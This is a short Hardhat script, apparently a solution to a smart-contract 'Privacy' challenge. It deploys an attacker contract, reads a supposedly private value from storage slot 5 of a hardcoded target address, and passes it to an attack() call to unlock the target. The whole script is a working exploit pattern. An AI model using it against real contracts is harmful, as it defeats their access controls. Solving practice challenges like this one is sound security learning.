const { ethers } = require("hardhat");


const ATTACKER_NAME = "attackV9";
const PrivacyContract="0x1bCd5a5Ab216Ee304C0d41dE25AA19a23D4E279c"


async function main() {
  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy();
  await attackerContract.deployed();
 
  console.log("contract address: ", attackerContract.address);

  // Descodificando los datos 
  const slot5Bytes = await ethers.provider.getStorageAt(PrivacyContract, 5);
  console.log("Private Data: ", slot5Bytes);

  const tx = await attackerContract.attack(slot5Bytes, PrivacyContract);
  await tx.wait();

  console.log("Unlocked Privacy Contract Successfully 🔓");

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});